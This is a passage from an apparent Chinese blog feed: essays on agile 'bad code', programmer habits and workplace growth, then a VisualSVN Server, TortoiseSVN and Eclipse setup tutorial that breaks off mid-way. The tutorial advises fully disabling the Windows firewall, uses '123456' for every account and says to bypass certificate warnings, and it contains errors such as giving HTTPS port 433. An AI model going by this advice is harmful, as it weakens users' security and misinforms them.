│   0   │ . │←─┘│ * └─────┴────┴────┴───────────────────────┴────┴────┴────┴────┘ └───┴───┴───┘ └───────┴───┴───┘ */</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>敏捷开发是当下软件开发的主流模式之一，为了摒弃以往瀑布式开发带来的弊端，敏捷开发推崇在团队中以个人为单位进行简单的模块化开发，它更注重的是团队间的沟通和模块间的衔接。</p><p>为了使代码层面上的沟通更便捷，一套套的编码规范和设计模式应运而生，毫无疑问，使用这些规范模式会使得我们的代码看起来更优雅，经验也证明这更有利于团队沟通。</p><p>对于经验丰富的程序员而言，针对某种功能使用合理的设计模式编写出规范的代码、并提供满足功能调用的接口，可能是易如反掌的事。但每个团队中都不可避免的会存在生涩的程序员，例如我。对我而言这种方式就并不完全是这么回事了。</p><p>即使我作为一个项目经验如何不足的程序员，独立开发一个简单功能模块的能力还是具备的。经常在编写代码之前，我脑中已有完整的思路，我可以很清晰地向别人陈述我的编程思想，我也很有信心可以把这些思想变成代码。但事实上这可能比我想象的要难得多。很多时候我发现我花费了比预期更多的时间，却无法写出一段可执行的代码。因为我在编码的时候，想得更多的不是如何去实现这个功能，而是如何让别人更舒服地看懂我的代码。</p><p>虽然很多开发团队都强调代码的优雅性，但这是以“可运行性”为前提的。这种过分放大观赏性代码的地位，本就是本末倒置的行为。优雅只是交流的辅助手段，但不是唯一的手段。</p><p>事实上，如果仅是实现需求的功能，而不去考虑任何外因，我确信我可以很快地写出一段可运行的“烂代码”。烂代码与优雅代码相比，最表面的区别可能仅是可读性差而已。而且团队开发很多时候并不需要关心别人开发的功能是如何实现的，这些优雅性的问题自然也不会被马上指出来了。</p><p>当然，我并不是倡导每个人都去写烂代码。烂代码只是一个过度的产物，考虑到以后代码的维护性和可扩展性，必须在烂代码保证功能需求后，对其进行重构。而往往优雅地重构自己既成的代码，很可能要比优雅地写出构思中的代码要容易得多。</p><p>摒弃优雅性的约束，烂代码使得开发过程更轻松、耗用资源更少、编程的目的性更强。其实这与敏捷开发的部分理念恰好是一致的：有目的指向的简单构建、有辅助指向的重构勇气。这正是烂代码的优雅之道。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">/** * 頂頂頂頂頂頂頂頂頂　頂頂頂頂頂頂頂頂頂 * 頂頂頂頂頂頂頂　　　　　頂頂　　　　　 * 　　　頂頂　　　頂頂頂頂頂頂頂頂頂頂頂 * 　　　頂頂　　　頂頂頂頂頂頂頂頂頂頂頂 * 　　　頂頂　　　頂頂　　　　　　　頂頂 * 　　　頂頂　　　頂頂　　頂頂頂　　頂頂 * 　　　頂頂　　　頂頂　　頂頂頂　　頂頂 * 　　　頂頂　　　頂頂　　頂頂頂　　頂頂 * 　　　頂頂　　　頂頂　　頂頂頂　　頂頂 * 　　　頂頂　　　　　　　頂頂頂　 * 　　　頂頂　　　　　　頂頂　頂頂　頂頂 * 　頂頂頂頂　　　頂頂頂頂頂　頂頂頂頂頂 * 　頂頂頂頂　　　頂頂頂頂　　　頂頂頂頂 */</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 心路历程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 敏捷开发 </tag>
            
            <tag> 沟通 </tag>
            
            <tag> 重构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>程序员的&quot;病态&quot;</title>
      <link href="/articles/insights/cheng-xu-yuan-de-bing-tai/"/>
      <url>/articles/insights/cheng-xu-yuan-de-bing-tai/</url>
      
        <content type="html"><![CDATA[<p>每个程序员都是从菜鸟过来的，而菜鸟的成长之路总是崎岖的。不断地碰壁、不断地摸索、不断地成长，从中难免衍生出各种各样的“病态”，而这其实都是我们切实作为一个程序员的证明。</p><h2 id="密集空间恐惧症"><a href="#密集空间恐惧症" class="headerlink" title="密集空间恐惧症"></a>密集空间恐惧症</h2><p>这应是程序员的通病了。不知道是谁的谎言：“程序员每天的工作就是看着一堆01代码”，这想着都会令人疯掉吧。每个程序员最怕看到的，就是那些一堆堆没换行没缩进的代码，更何况是一堆01代码。</p><p>如果一个程序员说他没有密集空间恐惧症，那他一定就是这堆代码的创始人之一了。我不理解为什么总有一些程序员要乐此不疲地代替编译器把代码中的空字符删去，编码规范出现的初衷，很可能就是为了对付这些程序员的——即使我忘记了我曾经或许也是他们中的一员。</p><h2 id="强迫症"><a href="#强迫症" class="headerlink" title="强迫症"></a>强迫症</h2><p>一些程序员在开发一个新项目的时候，会考虑太多情况，例如这种代码在以后的运行是否稳定、维护是否方便等。尤其是有一点项目经验但又不足、而且是完美主义者的程序员，在写代码的过程中会不断地考虑设计文档没有的东西，然后就很忘我地在项目代码上画蛇添足。</p><p>往往强迫自己写一个完美的程序的人，其现实就是：由于客观因素影响（如项目工时不足），导致最后提交的代码中出现太多没有被实现的抽象方法，结果反而是自己给自己挖了一堆无法填补的坑。</p><h2 id="神经质"><a href="#神经质" class="headerlink" title="神经质"></a>神经质</h2><p>基本上每个正常的程序员都有点神经质的。一个显著的特点就是：我们对自己的代码充满信心、但看到别人的代码都会疑神疑鬼，习惯性地认为那有BUG，然后千方百计地将其找出来。如果有能力把BUG修复，还会因此感到非常有成就感，尽管那个BUG是无关痛痒的。</p><p>程序界有一个“潜规则”：每个程序中 80% 的 BUG 都是别人发现的。这跟程序员的神经质应是脱不了干系了。</p><h2 id="妄想症"><a href="#妄想症" class="headerlink" title="妄想症"></a>妄想症</h2><p>大部分程序员最初接触到一些已经投入使用、但看上去写得很差的项目代码时，就会开始妄想自己的能力，认为自己可以用最好的技术去重写它。由于是一时冲动，欠缺考虑因素太多（如背景、支撑环境等），往往都是失败告终。</p><p>其唯一的好处可能就是在重写的过程中，可能确实学到了一些未能投入使用的新技术，仅此而已。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 心路历程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>工作需要经营</title>
      <link href="/articles/insights/gong-zuo-xu-yao-jing-ying/"/>
      <url>/articles/insights/gong-zuo-xu-yao-jing-ying/</url>
      
        <content type="html"><![CDATA[<p>转眼间我已实习了3个月有余，在这期间，相比于精通什么技能或业务，我更学会了应该如何去经营自己的工作。</p><p>我深深体会到工作并不是做好自己的份内事就足够的。单纯的努力工作，那只是为了谋生所付出的劳动；用心去经营的工作，才有可能会变成自己的事业。</p><h2 id="智于心，慧于行：审视自己的工作模式"><a href="#智于心，慧于行：审视自己的工作模式" class="headerlink" title="智于心，慧于行：审视自己的工作模式"></a>智于心，慧于行：审视自己的工作模式</h2><p>在公司里面，我被告知得更多的是如何去改善自己的工作模式，其中最倡导的是尽可能避免无意义的重复劳动。确实，平时与我们工作打交道的是各种各样的数据，要逐一去处理这些本质一样而问题各异的数据，无疑是事倍功半的行为。</p><p>好的工作模式，不仅可以提升工作效率，使我们逃离无意义劳动的怪圈，还可以实现公司价值和自身价值的双赢。而工作模式的优化，关键在于不断积累的经验。</p><p>例如平时可以多留一个心眼，把新的想法或遇到的问题进行记录，这样日积月累下来，在遇到新的问题时就不至于手忙脚乱，甚至可以利用以往类似的处理经验，达到事半功倍的效果。</p><p>不过，有好的想法固然不错，但更重要的是将其付诸行动，找到一种属于自己的工作模式，而不仅仅是纸上谈兵。</p><h2 id="慎言笃行：真诚做人，踏实做事"><a href="#慎言笃行：真诚做人，踏实做事" class="headerlink" title="慎言笃行：真诚做人，踏实做事"></a>慎言笃行：真诚做人，踏实做事</h2><p>“真诚做人，踏实做事”，这其实也就是我入职时了解到的企业文化之一。</p><p>做事先做人，人脉关系是经营工作的必修课。在我看来，交际圈的尺寸，与能否诚心待人是正相关的。但无论与他人相处如何，都必须谨慎言行，视场合说话。语言是把双刃剑，所谓“祸从口出”，当不知道说什么的时候，既不是阿谀奉承，也不应论人是非——不逞口舌之快，有时踏踏实实多做事，远比一切语言更具说服力。</p><p>想起我刚入职的时候，就接到了一个特殊“任务”：必须在限期内认识组内所有同事，并让他们认识我。这确实不是一个好差事，因为当时我连组内有哪些人都不清楚，就是说我连自我介绍的对象都没有……不过也不知是我人缘好还是面皮厚，这个任务最后还是完成了。</p><p>而现在的我已经结识不少其他部门的同事了，在这段期间，受到了非常多同事的包容和照顾，其实我能够这么快融入公司，离不开同事之间的良好氛围。我都甚至觉得，我的人际关系，其实是大家帮我经营起来的。</p><h2 id="云在青天水在瓶：心态决定位置"><a href="#云在青天水在瓶：心态决定位置" class="headerlink" title="云在青天水在瓶：心态决定位置"></a>云在青天水在瓶：心态决定位置</h2><p>这其实是我比较信奉的一句座右铭。云和水都是同一种物质，但是它们的形态决定了它们所处的位置。但也不应该因为身处青天而自傲，因为身处瓶中而自卑。</p><p>在职期间，我并不是所有工作都一帆风顺，我也因为规范性事故受过批评、被扣过绩效。后来也因为工作表现好而受到了表扬和奖励。但其实我个人看待事情的心态是比较淡薄的，我不会随便自暴自弃，也不会骄傲自负。我觉得既然是自己的问题，就应该承认并纠正，逃避并不是解决问题的方法；而对于嘉许，平常心看待即可。</p><p>我觉得相比于工作模式和人脉培养，工作其实更依赖于内心的修养。一份良好的心态，在一定程度上可以反映出以后工作的发展空间、以及对挫折的承受能力，甚至为自己提供了一个精神支持。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 心路历程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VisualSVN 使用手册</title>
      <link href="/articles/scm/visualsvn-shi-yong-shou-ce/"/>
      <url>/articles/scm/visualsvn-shi-yong-shou-ce/</url>
      
        <content type="html"><![CDATA[<h2 id="1-VisualSVN-Server简介"><a href="#1-VisualSVN-Server简介" class="headerlink" title="1. VisualSVN Server简介"></a>1. VisualSVN Server简介</h2><p>介绍VisualSVN Server之前，首先说说Subversion。</p><p>Subversion是一个自由，开源的版本控制系统。在Subversion管理下，文件和目录可以超越时空。Subversion将文件存放在中心版本库里。这个版本库很像一个普通的文件服务器，不同的是，它可以记录每一次文件和目录的修改情况。这样就可以籍此将数据恢复到以前的版本，并可以查看数据的更改细节：做了哪些修改，谁做的修改，等等。正因为如此，许多人将版本控制系统当作一种神奇的“时间机器”。</p><p>Subversion的版本库可以通过网络访问，从而使用户可以在不同的电脑上进行操作。从某种程度上来说，允许用户在各自的空间里修改和管理同一组数据可以促进团队协作。因为修改不再是单线进行（单线进行也就是必须一个一个进行），开发进度会进展迅速。此外，由于所有的工作都已版本化，也就不必担心由于错误的更改而影响软件质量—如果出现不正确的更改，只要撤销那一次更改操作即可。</p><p>某些版本控制系统本身也是软件配置管理系统（如SCM），这种系统经过精巧的设计，专门用来管理源代码树，并且具备许多与软件开发有关的特性—比如，对编程语言的支持，或者提供程序构建工具。不过Subversion并不是这样的系统。它是一个通用系统，可以管理任何类型的文件集。</p><p>VisualSVN和Subversion一样，都是版本控制器SVN的服务端，一个重要区别是VisualSVN比Subversion配置起来容易的多了。</p><p>如果直接使用Subversion，那么在Windows 系统上，要想让它随系统启动，就要封装SVN Server为Windws service，还要通过修改配置文件来控制用户权限，另外如果要想以Web方式（http协议）访问，一般还要安装配置Apache，如果是新手，岂不是很头痛？</p><p>而VisualSVN Serve集成了Subversion和Apache，省去了以上所有的麻烦。安装的时候SVN Server已经封装为Windws service，Apache服务器的配置也只是在图像界面上，指定认证方式、访问端口等简单操作；另外，用户权限的管理也是通过图像界面来配置。</p><p>需要知道的是，VisualSVN和VisualSVN Server又有一定区别，两者虽然同是SVN的**<em>服务端**</em>，但前者是收费的，后者是免费的。</p><p>还有一点， 用VisualSVN Server所搭建的服务器仅能在局域网下工作，这是团队开发中必须要注意的，所有成员都必须在同一局域网才能进行资源的同步与共享。一旦客户机与服务机跨越了路由，便无法相连。</p><h2 id="2-TortoiseSVN简介"><a href="#2-TortoiseSVN简介" class="headerlink" title="2. TortoiseSVN简介"></a>2. TortoiseSVN简介</h2><p>TortoiseSVN 是 Subversion 版本控制系统的一个免费开源**<em>客户端**</em>，可以超越时间的管理文件和目录。</p><p>实际上安装TortoiseSVN后，它是以一种类似“<strong>右键插件</strong>”的方式存在，使用TortoiseSVN能够更方便地管理SVN服务器上的资源，在团队开发中能够更有效实时地共享所有资源。</p><p>这里使用TortoiseSVN的一个主要原因是为了使用它的一个基本功能：把代码或资源迁入SVN服务器以达到同步共享的目的。</p><h2 id="3-VisualSVN-Server的安装"><a href="#3-VisualSVN-Server的安装" class="headerlink" title="3. VisualSVN Server的安装"></a>3. VisualSVN Server的安装</h2><p>先到网上下载VisualSVN Server的最新版（当前为2.1.10）。</p><p>运行 VisualSVN-Server-2.1.10.msi 安装程序后，点击Next按钮继续。</p><p><img src="./01.png" alt="图3-1"></p><p>勾选“I accept the terms in the License Agreement”选择框，点击Next按钮继续下一步操作。</p><p><img src="./02.png" alt="图3-2"></p><p>选择完全安装方式，点击Next按钮继续。</p><p><img src="./03.png" alt="图3-3"></p><p>到这里开始要注意：</p><ul><li>“Location”为VisualSVN Server的安装目录，可任意选择。</li><li>“Repositories”为SVN代码仓库的位置，即在使用时共享资料的位置，因此基于方便使用的考虑，不建议该位置设置太深（一般在磁盘根目录下再建一层即可），否则以后使用时同步资源库不方便。</li><li>“Server Port”为服务端口选择，后面有一个选择框“Use secure connection”。不勾选该选择框为使用快速链接【http协议】，此时供选择的端口有80/81/8080三个；勾选该选择框为使用安全链接【https协议】，这时的端口只有433/8433二个可用。</li></ul><p>一般建议选择安全链接【https协议】，即勾选选择框，端口使用默认的即可。设置完毕点击Next按钮继续下一步，然后一直到安装完成即可。</p><p><img src="./04.png" alt="图3-4"></p><p><img src="./05.png" alt="图3-5"></p><p><img src="./06.png" alt="图3-6"></p><h2 id="4-VisualSVN-Server的配置"><a href="#4-VisualSVN-Server的配置" class="headerlink" title="4. VisualSVN Server的配置"></a>4. VisualSVN Server的配置</h2><p>安装完VisualSVN Server后，运行VisualSVN Server Manger，启动界面，其中：</p><ul><li>“Status”为SVN服务器状态，包括运行状态和服务器URL地址。</li><li>“Logging”为服务器日志。</li><li>“Subversion Authentication”为账户（User和Groups）信息。</li><li>“Repositories”为SVN代码库信息。</li></ul><p><img src="./07.png" alt="图4-1"></p><p>首先添加一个代码库。右击“Repository”，出现下图所示的右键菜单，任意选择一种方式均可创建一个新的代码库。</p><p><img src="./08.png" alt="图4-2"></p><p>然后在文本框中输入代码库名称。</p><p>需要注意的是，若选择框“Creat default structure”被选中，则在代码库StartKit下面会创建trunk、branches、tags三个子目录；不选中，则只创建空的代码库StartKit。点击OK按钮，代码库StartKit则创建成功。</p><p><img src="./09.png" alt="图4-3"></p><p>创建完代码库后，没有任何内容在里面。添加内容的方法会在后面说明，这里暂且略过。</p><p><img src="./10.png" alt="图4-4"></p><p>下面，开始创建用户Users。在左侧的Users上点击右键，出现下图所示的右键菜单，任意选择一种方式均可创建一个新的用户。</p><p><img src="./11.png" alt="图4-5"></p><p>然后设置新用户的用户名和密码。输入信息后，点击OK按钮，就创建一个用户了。按照这种方式，创建4个用户：starter、Developer1、tester1、manager1。</p><p><img src="./12.png" alt="图4-6"></p><p>然后把这些用户授权给刚才创建的代码库StartKit。只有被授权的用户才能使用StartKit代码库内的资源，与其他用户进行资源共享。具体方法如下：</p><p>首先右击刚才创建的代码库StartKit, 选择“Properties”，弹出如下界面：</p><p><img src="./13.png" alt="图4-7"></p><p>点击”Add…”按钮，然后选择刚才创建的4个新用户，点击OK按钮则完成了授权工作。</p><blockquote><p>大家可能注意到了图中的Groups。是的，我们也可以先创建组，把用户添加到各个组中，然后对组进行授权，操作比较简单，在此略过。</p></blockquote><p><img src="./14.png" alt="图4-8"></p><p>把用户授权给代码库后，还要继续对每个用户（或组）进行详细的权限设置：</p><ul><li>“No Access”为禁止该用户访问代码库。</li><li>“Read Only”为虽然用户可以访问代码库，但只有读资源的权限。</li><li>“Read / Write”为用户不但可以访问代码库，还能对其中的资源进行读或写。</li></ul><p>需要注意的是，在用户列表中存在一个“Everyone”用户，为缺省用户，暂时无视之即可。</p><p><img src="./15.png" alt="图4-9"></p><p>设置完权限后，点击“确定”按钮，这4个用户就具有了访问StartKit代码库的不同权限。</p><hr><p>本例中各个用户的权限说明：</p><ul><li>用户starter：在团队中是新来者，不希望他向代码库中提交新代码，所以他只能读取代码库中的代码，不能提交代码。</li><li>用户tester1：是测试人员，不负责代码编写，所以也是只读权限。</li><li>用户Developer1：是开发人员，自然具有读写的权限。</li><li>用户manager1：是项目经理，自然具有读写的权限。</li></ul><p>在实际的项目开发过程中，Developer和tester往往不可能只有一个人，这时候使用组来授权会更加方便。</p><h2 id="5-TortoiseSVN的安装"><a href="#5-TortoiseSVN的安装" class="headerlink" title="5. TortoiseSVN的安装"></a>5. TortoiseSVN的安装</h2><p>先到网上下载TortoiseSVN的最新版（当前为1.7.2）。</p><p>运行 TortoiseSVN-1.7.4.22459-x64-svn-1.7.2.msi安装程序后，点击Next按钮继续。</p><p><img src="./16.png" alt="图5-1"></p><p>此时点选“I accept the terms in the License Agreement”选择框，点击Next按钮继续下一步操作。</p><p><img src="./17.png" alt="图5-2"></p><p>然后选择安装目录，任意即可。设置完毕点击Next按钮继续下一步，然后一直到安装完成。</p><p><img src="./18.png" alt="图5-3"></p><p><img src="./19.png" alt="图5-4"></p><p>点击Finish按钮后TortoiseSVN即安装完毕，但此时可能会提示重启系统，其实不重启也没有关系。</p><p><img src="./20.png" alt="图5-5"></p><h2 id="6-VisualSVN-Server与TortoiseSVN的基本组合使用"><a href="#6-VisualSVN-Server与TortoiseSVN的基本组合使用" class="headerlink" title="6. VisualSVN Server与TortoiseSVN的基本组合使用"></a>6. VisualSVN Server与TortoiseSVN的基本组合使用</h2><p><font color="red">注意在使用SVN服务之前，要先确保关闭Windows防火墙，否则可能出现无法连接到SVN服务器的情况</font>。</p><p><strong>关闭Windows防火墙的方法是</strong>：</p><blockquote><p>右击计算机 -&gt; 属性 -&gt; 系统和安全 -&gt; Windows防火墙 -&gt; 打开或关闭Windows防火墙</p></blockquote><hr><p>为方便下文说明，<strong>这里重新配置了一下VisualSVN Server</strong>：</p><p>SVN资源库为CodeLib（代码库）和FileLib（文件库），其所在的位置可在VisualSVN Server启动界面查得：</p><p><img src="./89.png" alt="图6-1"></p><p>用户及其权限分别为：（Everyone是缺省用户，暂无视之）</p><ul><li>CaiZhenBiao      Read Only</li><li>DengWeiWen      Read Only</li><li>LiaoQuanBin      Read/Write</li><li>LiJianCong       Read Only</li></ul><p>这里设置4个用户的密码均为123456。</p><p><img src="./21.png" alt="图6-2"></p><p>然后说一下用TortoiseSVN把源代码迁入SVN服务器的例子。</p><p>首先在Eclipse新建项目TestSVN：</p><p><img src="./22.png" alt="图6-3"></p><p>然后打开Eclipse的工作空间，可以找到项目TestSVN的文件夹，如下图：</p><p><img src="./23.png" alt="图6-4"></p><p>右击要迁入SVN服务器的项目文件夹TestSVN，可以看到TortoiseSVN出现在右键选项中。若选择Setting则可进行相关的设置，这里不做详细说明。我们选择Import把项目TestSVN迁入SVN服务器。</p><p><img src="./24.png" alt="图6-5"></p><p>此时弹出如下图所示的界面， URL ： <a href="https://exp-pc/svn/CodeLib">https://Exp-PC/svn/CodeLib</a> 就是当前要迁入的SVN服务器地址。其中 <a href="https://exp-pc/">https://Exp-PC/</a> 是服务器名，svn是代码库的根目录，CodeLib就是刚才添加的代码库。</p><p><img src="./25.png" alt="图6-6"></p><p>注意上图中左下角的“Include ignored files”，在第一次迁入源代码时没有用，可以不勾选。但是，在以后提交代码的时候是非常有用的。</p><p>点击OK按钮后则自动把TestSVN项目迁入了SVN服务器。迁入过程如下图所示。迁入完成后再点击OK关闭窗口。</p><p><img src="./26.png" alt="图6-7"></p><p>此时在VisualSVN Server中点击CodeLib，可在右方看到刚才迁入SVN服务器的源代码（如下图），若没有显示，右键刷新即可。</p><p><strong>注意</strong>：也可从这里的灰色条栏中看到当前代码库CodeLib的URL地址。</p><p><img src="./27.png" alt="图6-8"></p><p>不难发现项目TestSVN的项目文件夹没有了，在CodeLib中只保留了其项目内容。这是因为“根文件夹默认不上传”，因此要把整个TestSVN项目（包括项目文件夹在内）都上传到SVN服务器，可以把整个项目复制到任意一个空文件夹A中，使得文件夹A作为根文件夹，再右击文件夹A进行上传。效果如下图所示。</p><blockquote><p>资源上传到SVN服务器的是资源的副本，因此一旦资源被上传，即使在本地删除也不会对服务器中的资源有任何影响。</p></blockquote><p><img src="./28.png" alt="图6-9"></p><h2 id="7-资源的同步与共享"><a href="#7-资源的同步与共享" class="headerlink" title="7. 资源的同步与共享"></a>7. 资源的同步与共享</h2><p>第6节 介绍了如何利用TortoiseSVN把源代码上传到SVN服务器，其实上传非代码的其他资源也是同样的方法，把所需上传的资源（如Word、Excel、*.rar等）放在文件夹内，右键Import即可。同样要注意的是“根文件夹默认不上传”。</p><p>本节主要介绍怎样读取已上传到SVN服务器的指定资源的方法，<strong>主要有三种</strong>：</p><ul><li>（1）浏览器连接SVN服务器查看和下载资源；</li><li>（2）TortoiseSVN的Checkout功能导出SVN服务器资源；</li><li>（3）Eclipse连接SVN服务器查看和导出资源。</li></ul><p>方法（3）要在Eclipse安装SVN插件后（见 第8节）才能使用，这将在 第9节 和 第10节 介绍。<strong>所以在本节中主要介绍方法（1）和方法（2）</strong>。</p><hr><h3 id="7-1-浏览器连接SVN服务器查看和下载资源"><a href="#7-1-浏览器连接SVN服务器查看和下载资源" class="headerlink" title="7.1. 浏览器连接SVN服务器查看和下载资源"></a>7.1. 浏览器连接SVN服务器查看和下载资源</h3><p>要通过浏览器连接SVN服务器，首先需要获取SVN服务器的URL地址，URL地址的获取方法如下图所示：</p><p>打开VisualSVN Server界面，右击想要连接的代码库CodeLib，点选“Copy URL to Clipboard”即把代码库的URL复制到剪贴板。</p><p><img src="./29.png" alt="图7-1-1"></p><p>然后把URL黏贴到浏览器地址栏回车即可。</p><blockquote><p>部分浏览器可能会拦截，如火狐浏览器可能会出现下图的警告。此时点击“我已充分了解可能的风险”，然后点击“添加例外”，“确认安全例外”即可。 同时请确认windows防火墙已关闭。 其他浏览器也是类似的信任安全操作。</p></blockquote><p><img src="./30.png" alt="图7-1-2"></p><p>通过浏览器拦截后，会弹出身份认证窗口。此时只需要把刚才在VisualSVN Server中设置的4个用户之中的一个账号密码输入即可。然后浏览器就会反馈出当前SVN服务器所保有的资源。</p><p><img src="./31.png" alt="图7-1-3"></p><p><img src="./32.png" alt="图7-1-4"></p><p>下载界面如下：</p><p><img src="./33.png" alt="图7-1-5"></p><hr><h3 id="7-2-TortoiseSVN的Checkout功能导出SVN服务器资源"><a href="#7-2-TortoiseSVN的Checkout功能导出SVN服务器资源" class="headerlink" title="7.2. TortoiseSVN的Checkout功能导出SVN服务器资源"></a>7.2. TortoiseSVN的Checkout功能导出SVN服务器资源</h3><p>在任意空白位置点击鼠标右键，在弹出的功能菜单中选择“SVN Checkout”。</p><p><img src="./34.png" alt="图7-2-1"></p><p><img src="./35.png" alt="图7-2-2"></p><p>如上图所示（下述的“检出”实质就是把SVN服务器上的资源复制一份副本到本地）：</p><ul><li>“URL of repository”为要检出资源的SVN资源库地址。</li><li>“Checkout directory”为要检出到的位置，可自由选择。</li><li>“Checkout Depth”为检出资源的深度，默认为把整个数据库的资源都检出。若要指定检出的项目，可点击“Choose item”按钮进行选择，只勾选需要检出的资源，然后点选OK按钮。</li><li>“Revision”为版本控制选项，功能很重要，将在第11节叙述相关作用。</li><li>“Show log”为显示被选中的服务器的操作日志。</li></ul><p><img src="./36.png" alt="图7-2-3"></p><p><img src="./37.png" alt="图7-2-4"></p><p><img src="./38.png" alt="图7-2-5"></p><p>如上图为检出过程。</p><p>如下图为检出后的资源文件。其中左下角的Icon若为“绿色√”说明本地资源与服务器资源一致。当本地资源被修改后，“绿色√”变成“红色！”，说明本地资源与服务器资源不一致。</p><p>而关联本地与服务器资源一致性的功能由“.svn”文件夹实现，该文件夹默认为隐藏。当删除“.svn”文件夹后本地与服务器断开连接，Icon消失。</p><p><img src="./39.png" alt="图7-2-6"></p><p><img src="./40.png" alt="图7-2-7"></p><p><img src="./41.png" alt="图7-2-8"></p><h2 id="8-Eclipse的SVN插件安装"><a href="#8-Eclipse的SVN插件安装" class="headerlink" title="8. Eclipse的SVN插件安装"></a>8. Eclipse的SVN插件安装</h2><p>首先安装Eclipse关于SVN的插件。这里使用Eclipse在线安装插件的方法。</p><p>Google搜索“SVN  Eclipse插件”即可很容易找到SVN插件的安装地址，当前的安装地址为：<a href="http://subclipse.tigris.org/update_1.6.x">http://subclipse.tigris.org/update_1.6.x</a> 。</p><p>然后打开Eclipse -&gt; Help -&gt; Install New Software。</p><p><img src="./42.png" alt="图8-1"></p><p>把地址 <a href="http://subclipse.tigris.org/update_1.6.x">http://subclipse.tigris.org/update_1.6.x</a> 复制到“Work with”下按回车，等待加载如下图的3个插件，点击 “Select all”按钮选中全部，然后点击Next按钮执行下一步，按提示操作即可完成安装。可能安装的时间较漫长，请耐心等待。</p><p><img src="./43.png" alt="图8-2"></p><h2 id="9-Eclipse与SVN服务器的连接"><a href="#9-Eclipse与SVN服务器的连接" class="headerlink" title="9. Eclipse与SVN服务器的连接"></a>9. Eclipse与SVN服务器的连接</h2><p>安装SVN插件后，找到Eclipse左下角的“+”（快速视图菜单），再点击打开快速视图菜单，选择Other。在弹出的界面中输入“SVN”，点选搜索到的“SVN资源库”，点击OK按钮确认。</p><p><img src="./44.png" alt="图9-1"></p><p><img src="./45.png" alt="图9-2"></p><p>此时会出现SVN资源库窗口（如下图）。在空白处右击，选择“新建”，在点选“资源库位置”。然后在弹出的窗口输入SVN服务器的地址，这里使用前面创建的代码库的URL地址：<a href="https://exp-pc/svn/CodeLib">https://Exp-PC/svn/CodeLib</a> 。地址无误则点击Finish按钮确定。</p><p><img src="./46.png" alt="图9-3"></p><p><img src="./47.png" alt="图9-4"></p><p><img src="./48.png" alt="图9-5"></p><p>此时会弹出如下图所示的对话框，选择“永久接受”，然后输入用户名和密码。这里必须使用授权给当前正在同步的SVN资源库的用户。 前面第6节中，配置给CodeLib代码库的用户有4个，这里选择其中的一个即可，为避免以后再输入账户密码，可选择“保存密码”。</p><p><img src="./49.png" alt="图9-6"></p><p><img src="./50.png" alt="图9-7"></p><p>此时已经可以看到SVN服务器上的代码库，展开则可看到保存在SVN服务器的资源。</p><p><img src="./51.png" alt="图9-8"></p><h2 id="10-利用SVN插件进行代码的同步与共享"><a href="#10-利用SVN插件进行代码的同步与共享" class="headerlink" title="10. 利用SVN插件进行代码的同步与共享"></a>10. 利用SVN插件进行代码的同步与共享</h2><h3 id="10-1-从SVN服务器上把代码同步到本地"><a href="#10-1-从SVN服务器上把代码同步到本地" class="headerlink" title="10.1. 从SVN服务器上把代码同步到本地"></a>10.1. 从SVN服务器上把代码同步到本地</h3><p>打开Eclipse的“SVN资源库”，找到要下载的源代码项目，右击该项目的根文件夹，选择“检出为”则可把服务器上的项目同步到本地。</p><p><img src="./52.png" alt="图10-1-1"></p><p><img src="./53.png" alt="图10-1-2"></p><p>如上图所示，检出时会提示命名项目名称，任意命名均可（只要与本地已有项目不重名）。命名完毕后直接按Finish按钮。</p><p>此时返回本地Project目录，即可看到刚才从SVN服务器同步下来的TestSVN项目。</p><p>如下图所示，从服务器上同步到本地的项目，可以在左边项目列表看到该源代码的来源，以及最后被更新的时间和用户信息。</p><p><img src="./54.png" alt="图10-1-3"></p><hr><h3 id="10-2-把本地的代码共享到SVN服务器"><a href="#10-2-把本地的代码共享到SVN服务器" class="headerlink" title="10.2. 把本地的代码共享到SVN服务器"></a>10.2. 把本地的代码共享到SVN服务器</h3><p>新建项目TestSVNUpdata，右击项目文件夹，选择Teamshare project在弹出的界面中选择“SVN”，点击Next按钮继续。</p><p><img src="./55.png" alt="图10-2-1"></p><p><img src="./56.png" alt="图10-2-2"></p><p>如下图所示，选择“使用已有资源库位置”，然后在资源库地址列表中点选要上传的SVN服务器，点击Next按钮继续下一步。若资源库地址列表为空，则选择“创建新的资源库的位置”，输入要上传的SVN服务器的URL地址即可。</p><p><img src="./57.png" alt="图10-2-3"></p><p>到这步选择“使用项目名做为文件夹名”，点Finish后自动切换到Synchronize标签，其中Synchronize显示的是为等待同步到服务器的项目，这里只有项目TestSVNUpdata可供选择。右击TestSVNUpdata项目文件夹，选择“提交”。</p><p><img 